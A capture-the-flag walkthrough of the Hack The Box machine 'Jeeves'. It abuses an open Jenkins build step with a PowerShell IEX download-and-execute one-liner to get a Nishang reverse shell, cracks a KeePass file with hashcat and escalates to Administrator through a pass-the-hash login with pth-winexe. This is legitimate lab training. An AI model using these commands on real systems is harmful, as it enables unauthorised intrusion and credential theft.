## Hack The Box - Jeeves (10.10.10.63)
Jeeves is a medium box from Hack The Box and it is a Windows machine. It presents a minor rabbit hole but with enough enumeration and familiarity with Windows Powershell, Netcat, and Hashcat attackers should have no issue obtaining their flags. 


### Enumeration
To begin with, we will start a Nmap scan on our target as part of our first enumeration steps. For this, I will opt to use nmapAutomator, although you can run a traditional Nmap scan. 

```markdown
PORT      STATE SERVICE      VERSION
80/tcp    open  http         Microsoft IIS httpd 10.0
| http-methods: 
|_  Potentially risky methods: TRACE
|_http-server-header: Microsoft-IIS/10.0
|_http-title: Ask Jeeves
135/tcp   open  msrpc        Microsoft Windows RPC
445/tcp   open  microsoft-ds Microsoft Windows 7 - 10 microsoft-ds (workgroup: WORKGROUP)
50000/tcp open  http         Jetty 9.4.z-SNAPSHOT
|_http-server-header: Jetty(9.4.z-SNAPSHOT)
|_http-title: Error 404 Not Found
Service Info: Host: JEEVES; OS: Windows; CPE: cpe:/o:microsoft:windows
```


We have four open ports on our target machine. After no success with enumerating port 445 (SMB), I decided to open our target machine in a web browser to view what is hosted on port 80 (http://10.10.10.63:80). It appears our target is running ‘Ask Jeeves’ as a service and is running on ‘Microsoft-IIS/10.0’. I will run a DirBuster scan to enumerate further files and directories here but did not obtain anything useful. 


![jeeves](https://user-images.githubusercontent.com/85421181/121051454-17436980-c77f-11eb-8650-e492b0a48f6c.png)



Continuing with our enumeration, I decided to view what is hosted on port 50000 (http://10.10.10.63:50000). It appears our target is running Jetty on this port and it may be running on version 9.4.x according to our Nmap scan from earlier. 

![jetty](https://user-images.githubusercontent.com/85421181/121051549-288c7600-c77f-11eb-8db4-3394bb1d663b.png)

As I run another DirBuster scan on our target machine and port 50000 I decide to research possible exploits available for Jetty 9.4.x and later. After attempting several exploits from GitHub, ExploitDB, and Metasploit I decided that there must be another method to obtain our initial foothold. My DirBuster scan from earlier has finished and has revealed a new directory (/askjeeves). 

![dirb](https://user-images.githubusercontent.com/85421181/121051588-2e825700-c77f-11eb-9ef5-439a7feee42a.png)

It appears our target is hosting an application called Jenkins, software for developers to automatically build, test, and deploy their software. 

![jenkins](https://user-images.githubusercontent.com/85421181/121051616-33470b00-c77f-11eb-9446-4c541faf6114.png)

After poking around the application it appears that we can build and deploy new projects without any restriction. We will go to ‘New Item > Freestyle project’ and name our project whatever we choose. On the next page, we are given several options and the most interesting is the ‘Build’ sections where we can select ‘Execute Windows batch command’ as an option. Interesting! Let us craft a payload using a Powershell one-liner and Nishang's Invoke-PowerShellTcp.ps1 script. 

### Initial Foothold
We will append the following line to the very end of our Invoke-PowerShellTcp.ps1 script to enable the callback to our attacker machine once executed on our target machine. Please ensure to change ‘10.10.10.10.’ to your IP Address and ‘4444’ to the port which you will be listening on for your reverse shell (Netcat will be utilized for this step and will be explained later). 

```markdown
Invoke-PowerShellTcp -Reverse -IPAddress 10.10.10.10 -Port 4444 
```
Great, our script is ready to go! Let's host it on our attacker machine utilizing either SimpleHTTPServer or http.server (either will work). 

```markdown
python -m SimpleHTTPServer 8080
or
python3 -m http.server 8080
``` 
Our attacker machine is now hosting 'Invoke-PowerShellTcp.ps1' on our IP address on port 8080. Once downloaded and executed by our target it will send a reverse shell to our attacker machine. We will catch this reverse shell utilizing Netcat. To do this, execute the below command and ensure that the port listed in this command is the same declared at the bottom of our Invoke-PowerShellTcp.ps1 script from earlier.

```markdown
nc -lvnp 4444
```
Time to get our initial foothold. Powershell's IEX is a powerful resource to have in your toolkit so if this is your first time using it, make sure to commit the following to memory because there will be plenty of opportunities to use it again. We will be executing the following Powershell one-liner code in the ‘Execute Windows batch command’ box of our Jenkins application. Before doing so, ensure that 10.10.10.10 is replaced with your attacker machine's IP address. 

```markdown
powershell IEX (New-Object Net.WebClient).downloadString('http://10.10.10.10:8080/Invoke-PowerShellTcp.ps1');
```
![build](https://user-images.githubusercontent.com/85421181/121052031-96d13880-c77f-11eb-8fa3-6c440ed7b0c0.png)

Click ‘Save’ and ‘Build Now’ to see your file get pulled from your attacker machine and executed on the target machine to provide you with your reverse shell caught by Netcat. Congratulations, we have our initial foothold and appear to be a user name ‘kohsuke’. Let us continue with our privilege escalation. 

![foothold](https://user-images.githubusercontent.com/85421181/121052041-9afd5600-c77f-11eb-859e-3a810084317d.png)

### Privledge Escalation
After searching around our target's machine I notice there is a file called ‘CEH.kdbx’ located in ‘C:\Users\kohsuke\Documents’. This file extension is indicative of a KeePass file which we will be using keepass2john and Hashcat to crack and obtain the cleartext password. So first, download the file to your local attacker machine. 

![CEH](https://user-images.githubusercontent.com/85421181/121052053-9df84680-c77f-11eb-9988-cd6287d6bf24.png)

On your attacker machine run the following command to turn your .kdbx file into a hash we can feed into Hashcat for a cleartext password.

```markdown
keepass2john CEH.kdbx > CEH.hash
```
![hash](https://user-images.githubusercontent.com/85421181/121052080-a3559100-c77f-11eb-8041-7d05a4ef1eb0.png)

We will now feed this hash file (CEH.hash) into a tool called Hashcat which will provide us with the cleartext password. For this password crack, I will be utilizing rockyou.txt as a password file but I encourage everyone to checkout SecLists for more resources. 

```markdown
hashcat -m 13400 CEH.hash rockyou.txt
```
OUTPUT:
![hashcat](https://user-images.githubusercontent.com/85421181/121052096-a6e91800-c77f-11eb-8995-1231c2e705ed.png)

With our password being ‘moonshine1’ we can now view the contents of the KeePass file!

![keepass](https://user-images.githubusercontent.com/85421181/121052107-a9e40880-c77f-11eb-8dba-d05c060f6ed8.png)


Viewing all the entries it seems like ‘Backup stuff’ contains an NTLM hash in the password field. 

```markdown
aad3b435b51404eeaad3b435b51404ee:e0fb1fb85756c24235ff238cbe81fe00
```
We can use a pass-the-hash attack to gain access to our target's machine as Administrator. We will use pth-winexe for this attack.

```markdown
pth-winexe -U Administrator%aad3b435b51404eeaad3b435b51404ee:e0fb1fb85756c24235ff238cbe81fe00 //10.10.10.63 cmd.exe
```
![pth-winexe](https://user-images.githubusercontent.com/85421181/121052128-b0728000-c77f-11eb-8073-f2db91708325.png)

### Closing Remarks
  We are now Administrator! Before ending this, it is worth noting that you may not be able to obtain your root flag as easily as the user flag. This is because there is a file stream via the ‘hm.txt’ file located in C:\Users\Administrator\Desktop' and it can only be seen by appending /r to your ‘dir’ command. 

![dir](https://user-images.githubusercontent.com/85421181/121052143-b4060700-c77f-11eb-8d07-69e297f563bb.png)

Utilize the following command to obtain your root flag.

```markdown
powershell Get-Content -path C:\Users\Administrator\Desktop\hm.txt -stream root.txt
```
Thanks for reading! 
